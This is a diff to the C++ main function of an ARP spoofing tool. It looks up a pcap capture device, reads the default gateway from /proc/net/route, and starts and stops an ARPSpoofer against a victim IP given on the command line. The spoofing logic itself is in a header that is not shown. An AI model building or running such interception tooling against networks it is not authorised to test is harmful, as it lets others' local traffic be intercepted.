@@ -1,23 +1,31 @@
 #include<iostream>
+#include<pcap/pcap.h>
 #include<cstring>
-#include<unistd.h>
-#include<arpa/inet.h>
 #include"arpspoofer.h"
 using namespace std;
 
+#include"filtering.h"
 
-int main(int argc, char* argv[])
+int main(int argc,char* argv[])
 {
+    char *dev;
+    char errbuf[PCAP_ERRBUF_SIZE];
     FILE *f;
     char line[100],*p,*c,*g,*save;
     struct in_addr gatewayip;
     char gateway[20];
 
-    if(argc != 2){
-        cout << "[-] Usage " << argv[0] << " <Victim>" << endl;
-        return 1;
+    if(argc != 2)
+    {
+        cout << "[-] Usage " << argv[0] << " [Target IP]" << endl;
+        return 0;
     }
 
+    if((dev = pcap_lookupdev(errbuf)) == NULL)
+    {
+        cout << "[!] pcap_lookupdev " << errbuf << endl;
+        return 1;
+    }
 
     f = fopen("/proc/net/route","r");
     while(fgets(line,100,f))
@@ -40,9 +48,12 @@ int main(int argc, char* argv[])
         }
     }
     inet_ntop(AF_INET,&gatewayip.s_addr,gateway,sizeof(gateway));
-    ARPSpoofer arpc(argv[1],gateway);
+    ARPSpoofer arpc(dev,argv[1],gateway);
+    cout << "[*] start arp spoofing" << endl;
     arpc.startarpspoofing();
+    cout << "Press Anykey to stop";
     cin.get();
     arpc.stoparpspoofing();
     return 0;
+
 }
